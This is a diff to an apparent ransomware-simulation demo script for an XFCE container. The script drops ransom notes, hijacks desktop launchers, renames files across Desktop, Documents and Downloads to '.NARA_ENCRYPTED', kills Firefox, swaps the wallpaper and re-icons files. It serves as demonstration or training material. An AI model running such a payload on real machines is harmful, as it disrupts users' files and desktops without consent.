@@ -19,6 +19,7 @@ import subprocess
 import struct
 import sys
 import zlib
+from pathlib import Path
 
 # Absolute paths — XFCE resolves themed names inconsistently in minimal images
 _ICON_DIR = "/tmp/nara_icons"
@@ -58,17 +59,111 @@ DEFAULT_NOTE = """
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
-DESKTOP = os.path.expanduser("~/Desktop")
 WALLPAPER_PATH = "/tmp/nara_ransom_wallpaper.jpg"
 DUMMY_FILES_DIR = "/tmp/nara_demo_files"
 # Ransom note copy for launcher Exec (survives desktop file renames)
 NOTE_FOR_LAUNCHERS = "/tmp/README_RANSOM.txt"
 
 
+def _expand_user_dir_vars(s: str) -> str:
+    """Expand $HOME in paths from user-dirs.dirs."""
+    home = os.path.expanduser("~")
+    return s.replace("$HOME", home).strip('"')
+
+
+def _home_dir() -> str:
+    """Canonical home directory for this process (in the container: /root)."""
+    h = os.environ.get("HOME") or os.path.expanduser("~")
+    try:
+        return os.path.realpath(h)
+    except OSError:
+        return os.path.expanduser("~")
+
+
+def _xdg_user_dir(name: str, fallback: str) -> str:
+    """
+    Resolve XDG user directory (Desktop, Documents, …) for the VNC session.
+    Falls back to ~/Desktop etc. when ~/.config/user-dirs.dirs is missing.
+    Returned path is normalized with realpath() so it matches Thunar/xfdesktop.
+    """
+    cfg = os.path.expanduser("~/.config/user-dirs.dirs")
+    key = f"XDG_{name}_DIR"
+    raw_path = ""
+    if os.path.isfile(cfg):
+        try:
+            with open(cfg, encoding="utf-8", errors="replace") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    if line.startswith(f"{key}="):
+                        val = line.split("=", 1)[1].strip()
+                        raw_path = _expand_user_dir_vars(val)
+                        break
+        except OSError:
+            pass
+    if not raw_path:
+        raw_path = os.environ.get(key) or ""
+        if raw_path:
+            raw_path = _expand_user_dir_vars(raw_path)
+    if not raw_path:
+        raw_path = os.path.expanduser(fallback)
+    try:
+        return os.path.realpath(raw_path)
+    except OSError:
+        return raw_path
+
+
+def _safe_user_subdir(xdg_name: str, fallback_tilde: str, leaf: str) -> str:
+    """
+    Resolve XDG path but never return filesystem root (/) or paths outside $HOME.
+
+    Thunar's "File System" and some shortcuts point at Location: / — that is NOT
+    /root/Desktop. The visible desktop folder for root in Docker is
+    /root/Desktop (i.e. $HOME/Desktop), not "root" at /.
+    """
+    home = _home_dir()
+    default = os.path.join(home, leaf)
+    cand = _xdg_user_dir(xdg_name, fallback_tilde)
+    try:
+        cr = os.path.realpath(cand)
+    except OSError:
+        return default
+    root_fs = os.path.realpath("/")
+    if cr in (root_fs, "/") or cr == home:
+        return default
+    # Must stay under $HOME (ignore bogus XDG pointing at /srv, etc.)
+    if not (cr.startswith(home + os.sep) or cr == default):
+        return default
+    return cr
+
+
+def _desktop_path() -> str:
+    d = _safe_user_subdir("DESKTOP", "~/Desktop", "Desktop")
+    # Some images use ~/desktop (case); prefer real Desktop, fall back if only lowercase exists
+    if not os.path.isdir(d):
+        low = os.path.join(_home_dir(), "desktop")
+        if os.path.isdir(low):
+            try:
+                return os.path.realpath(low)
+            except OSError:
+                return low
+    return d
+
+
+def _documents_path() -> str:
+    return _safe_user_subdir("DOCUMENTS", "~/Documents", "Documents")
+
+
+def _downloads_path() -> str:
+    return _safe_user_subdir("DOWNLOAD", "~/Downloads", "Downloads")
+
+
 def drop_ransom_note(custom_message: str = ""):
     """Drop README_RANSOM.txt on the desktop."""
-    os.makedirs(DESKTOP, exist_ok=True)
-    note_path = os.path.join(DESKTOP, "README_RANSOM.txt")
+    desktop = _desktop_path()
+    os.makedirs(desktop, exist_ok=True)
+    note_path = os.path.join(desktop, "README_RANSOM.txt")
     content = custom_message if custom_message else DEFAULT_NOTE
     with open(note_path, "w") as f:
         f.write(content)
@@ -95,21 +190,34 @@ def shutdown_vulnerable_webapp():
     print("[RANSOMWARE] Web server on :8080 stopped (simulation)")
 
 
-def encrypt_loose_files_everywhere():
+def encrypt_loose_files_everywhere() -> list[str]:
     """
     Rename user-visible files to *.NARA_ENCRYPTED (simulated encryption).
     Touches Desktop + Documents + dummy dir; skips .desktop launchers here (handled by hijack).
+    Returns canonical paths of encrypted files (for gio icons — avoids symlink/XDG mismatches).
     """
-    roots = [
-        DESKTOP,
-        os.path.expanduser("~/Documents"),
-        os.path.expanduser("~/Downloads"),
-        DUMMY_FILES_DIR,
+    roots_raw = [
+        _desktop_path(),
+        _documents_path(),
+        _downloads_path(),
+        os.path.realpath(DUMMY_FILES_DIR),
     ]
-    count = 0
-    for root in roots:
-        if not os.path.isdir(root):
+    # Same real path only once (symlinks / overlapping XDG)
+    roots = []
+    seen_r: set[str] = set()
+    for r in roots_raw:
+        if not r or not os.path.isdir(r):
             continue
+        rp = os.path.realpath(r)
+        if rp in seen_r:
+            continue
+        seen_r.add(rp)
+        roots.append(rp)
+
+    encrypted_paths: list[str] = []
+    count = 0
+    note_real = os.path.realpath(NOTE_FOR_LAUNCHERS)
+    for root in roots:
         for dirpath, _dirnames, filenames in os.walk(root):
             for fn in filenames:
                 if fn.endswith(".NARA_ENCRYPTED"):
@@ -119,16 +227,22 @@ def encrypt_loose_files_everywhere():
                 path = os.path.join(dirpath, fn)
                 if not os.path.isfile(path):
                     continue
-                if os.path.abspath(path) == os.path.abspath(NOTE_FOR_LAUNCHERS):
-                    continue
+                try:
+                    if os.path.realpath(path) == note_real:
+                        continue
+                except OSError:
+                    if os.path.abspath(path) == os.path.abspath(NOTE_FOR_LAUNCHERS):
+                        continue
                 dst = path + ".NARA_ENCRYPTED"
                 try:
                     os.rename(path, dst)
                     count += 1
+                    encrypted_paths.append(os.path.realpath(dst))
                     print(f"[RANSOMWARE] Encrypted: {path} → {dst}")
                 except OSError as e:
                     print(f"[RANSOMWARE] Skip {path}: {e}")
     print(f"[RANSOMWARE] Loose files encrypted (simulation): {count}")
+    return encrypted_paths
 
 
 def seed_dummy_sensitive_files():
@@ -149,6 +263,206 @@ def seed_dummy_sensitive_files():
             f.write(content)
 
     print(f"[RANSOMWARE] Seeded dummy files in {DUMMY_FILES_DIR}")
+
+    # Visible “victim” files on the XFCE desktop (not only under /tmp)
+    desktop = _desktop_path()
+    os.makedirs(desktop, exist_ok=True)
+    for fname, content in dummy_files[:3]:
+        fpath = os.path.join(desktop, fname)
+        try:
+            with open(fpath, "w") as f:
+                f.write(content)
+            print(f"[RANSOMWARE] Seeded desktop file → {fpath}")
+        except OSError as e:
+            print(f"[RANSOMWARE] Skip desktop seed {fpath}: {e}")
+
+
+def _xfce_session_environ() -> dict:
+    """Reuse the same DBus session as xfce4-session so gio/Thunar see icon metadata."""
+    env = os.environ.copy()
+    env.setdefault("DISPLAY", ":1")
+    try:
+        r = subprocess.run(
+            ["pgrep", "-o", "xfce4-session"],
+            capture_output=True,
+            text=True,
+            timeout=5,
+        )
+        pid = (r.stdout or "").strip()
+        if pid.isdigit() and os.path.isfile(f"/proc/{pid}/environ"):
+            with open(f"/proc/{pid}/environ", "rb") as f:
+                for entry in f.read().split(b"\0"):
+                    if entry.startswith(b"DBUS_SESSION_BUS_ADDRESS="):
+                        env["DBUS_SESSION_BUS_ADDRESS"] = entry.split(b"=", 1)[1].decode(
+                            "utf-8", "replace"
+                        )
+                        break
+    except (OSError, subprocess.TimeoutExpired):
+        pass
+    return env
+
+
+def _all_desktop_dirs_for_icons() -> list[str]:
+    """Canonical desktop folder(s); always includes /root/Desktop for the NARA container."""
+    seen: set[str] = set()
+    out: list[str] = []
+    for d in ("/root/Desktop", os.path.join(_home_dir(), "Desktop"), _desktop_path()):
+        try:
+            r = os.path.realpath(d)
+            if r not in seen and os.path.isdir(r):
+                seen.add(r)
+                out.append(r)
+        except OSError:
+            continue
+    return out
+
+
+def _icon_uri_for_path(path: str, uri: str, warn_uri: str) -> str:
+    base = os.path.basename(path)
+    if base.endswith(".desktop") and ("READ_ME" in base or "NARA__READ" in base):
+        return warn_uri
+    if base.endswith(".desktop"):
+        return uri
+    return uri
+
+
+def apply_r_icons_final(encrypted_paths: list[str] | None = None):
+    """
+    LAST STEP: Team Rocket R on all GTK metadata targets — especially everything
+    under /root/Desktop (files, folders, .desktop, *.NARA_ENCRYPTED).
+    """
+    icon_path = _ICON_FOLDER if os.path.isfile(_ICON_FOLDER) else _ICON_WARN
+    uri = Path(icon_path).resolve().as_uri()
+    warn_uri = Path(_ICON_WARN).resolve().as_uri() if os.path.isfile(_ICON_WARN) else uri
+
+    roots_raw = [
+        _desktop_path(),
+        _documents_path(),
+        _downloads_path(),
+        os.path.realpath(DUMMY_FILES_DIR),
+    ]
+    seen_r: set[str] = set()
+    walk_roots: list[str] = []
+    for r in roots_raw:
+        if not r or not os.path.isdir(r):
+            continue
+        rp = os.path.realpath(r)
+        if rp in seen_r:
+            continue
+        seen_r.add(rp)
+        walk_roots.append(rp)
+
+    genv = _xfce_session_environ()
+    n_ok = 0
+    n_fail = 0
+    first_gio_err: str | None = None
+    gio_done: set[str] = set()
+
+    def _gio_set(path: str, icon_uri: str) -> None:
+        nonlocal n_ok, n_fail, first_gio_err
+        try:
+            rk = os.path.realpath(path)
+        except OSError:
+            rk = path
+        if rk in gio_done:
+            return
+        try:
+            r = subprocess.run(
+                ["gio", "set", path, "metadata::custom-icon", icon_uri],
+                capture_output=True,
+                timeout=15,
+                text=True,
+                env=genv,
+            )
+            if r.returncode == 0:
+                n_ok += 1
+                gio_done.add(rk)
+            else:
+                n_fail += 1
+                if first_gio_err is None:
+                    err = (r.stderr or r.stdout or "").strip()[:400]
+                    first_gio_err = f"{path}: {err}" if err else path
+        except (FileNotFoundError, OSError) as e:
+            n_fail += 1
+            if first_gio_err is None:
+                first_gio_err = f"{path}: {e}"
+
+    to_icon: set[str] = set()
+
+    if encrypted_paths:
+        for p in encrypted_paths:
+            try:
+                to_icon.add(os.path.realpath(p))
+            except OSError:
+                to_icon.add(p)
+
+    for root in walk_roots:
+        for dirpath, _dn, filenames in os.walk(root):
+            for fn in filenames:
+                if not fn.endswith(".NARA_ENCRYPTED"):
+                    continue
+                full = os.path.join(dirpath, fn)
+                if os.path.isfile(full):
+                    try:
+                        to_icon.add(os.path.realpath(full))
+                    except OSError:
+                        to_icon.add(full)
+
+    # 1) /root/Desktop (and $HOME/Desktop): every file & folder — correct .desktop icons first
+    desktop_items = 0
+    for ddesk in _all_desktop_dirs_for_icons():
+        try:
+            with os.scandir(ddesk) as it:
+                for ent in it:
+                    p = ent.path
+                    try:
+                        iu = _icon_uri_for_path(p, uri, warn_uri)
+                        _gio_set(p, iu)
+                        desktop_items += 1
+                    except OSError:
+                        continue
+        except OSError as e:
+            print(f"[RANSOMWARE] Desktop icon sweep skipped ({ddesk}): {e}")
+
+    # 2) Encrypted files outside desktop sweep duplicates (e.g. Documents, /tmp/nara_demo_files)
+    for p in sorted(to_icon):
+        if os.path.isfile(p):
+            _gio_set(p, uri)
+
+    msg = (
+        f"[RANSOMWARE] R icon metadata (final pass): {n_ok} ok, {n_fail} failed "
+        f"— desktop entries touched: {desktop_items}"
+    )
+    if first_gio_err and n_fail:
+        msg += f"\n[RANSOMWARE] First gio error: {first_gio_err}"
+    print(msg)
+
+
+def refresh_desktop_icons():
+    """Nudge xfdesktop to redraw after icon metadata changes (same session as desktop)."""
+    env = _xfce_session_environ()
+    try:
+        subprocess.run(
+            ["bash", "-c", "xfdesktop --reload 2>/dev/null || true"],
+            env=env,
+            capture_output=True,
+            timeout=15,
+        )
+    except (OSError, subprocess.TimeoutExpired):
+        pass
+
+
+def kill_firefox():
+    """Close the browser opened for the Flask demo so the desktop is unobstructed."""
+    try:
+        subprocess.run(
+            ["bash", "-c", "pkill -f '[f]irefox' 2>/dev/null || pkill -f '/opt/firefox' 2>/dev/null || true"],
+            timeout=15,
+            capture_output=True,
+        )
+        print("[RANSOMWARE] Firefox closed (simulation)")
+    except (OSError, subprocess.TimeoutExpired) as e:
+        print(f"[RANSOMWARE] Firefox kill skipped: {e}")
 
 
 def show_ransom_popups(count: int = 10):
@@ -181,13 +495,14 @@ def hijack_desktop_shortcuts():
     Replace ALL existing desktop shortcuts with Team Rocket R-branded locked versions,
     then drop ransom-themed shortcuts so the XFCE desktop visibly reflects the takeover.
     """
-    os.makedirs(DESKTOP, exist_ok=True)
+    desktop = _desktop_path()
+    os.makedirs(desktop, exist_ok=True)
     readme = NOTE_FOR_LAUNCHERS
     rocket_icon = _ICON_FOLDER  # Red R on dark — used for all hijacked icons
 
     # Replace ALL existing .desktop files with "LOCKED" versions using the R icon
-    for name in list(os.listdir(DESKTOP)):
-        path = os.path.join(DESKTOP, name)
+    for name in list(os.listdir(desktop)):
+        path = os.path.join(desktop, name)
         if not name.endswith(".desktop") or "NARA_" in name or not os.path.isfile(path):
             continue
 
@@ -230,7 +545,7 @@ def hijack_desktop_shortcuts():
         ("NARA__MAIL_LOCKED.desktop", "Mail — ENCRYPTED", _ICON_MAIL),
     ]
     for fname, title, icon in templates:
-        path = os.path.join(DESKTOP, fname)
+        path = os.path.join(desktop, fname)
         lines = [
             "[Desktop Entry]",
             "Version=1.0",
@@ -455,11 +770,16 @@ def main(custom_message: str = ""):
     shutdown_vulnerable_webapp()
     drop_ransom_note(custom_message)
     generate_rocket_icons()
-    hijack_desktop_shortcuts()
+    # All victim files exist before we touch .desktop launchers or encrypt.
     seed_dummy_sensitive_files()
-    encrypt_loose_files_everywhere()
+    hijack_desktop_shortcuts()
+    encrypted_paths = encrypt_loose_files_everywhere()
     change_wallpaper()
+    kill_firefox()
     show_ransom_popups(10)
+    # Icons last: /root/Desktop and user Desktop — all entries + encrypted files elsewhere
+    apply_r_icons_final(encrypted_paths)
+    refresh_desktop_icons()
 
     print("\n" + "═" * 60)
     print("[RANSOMWARE] Payload complete.")
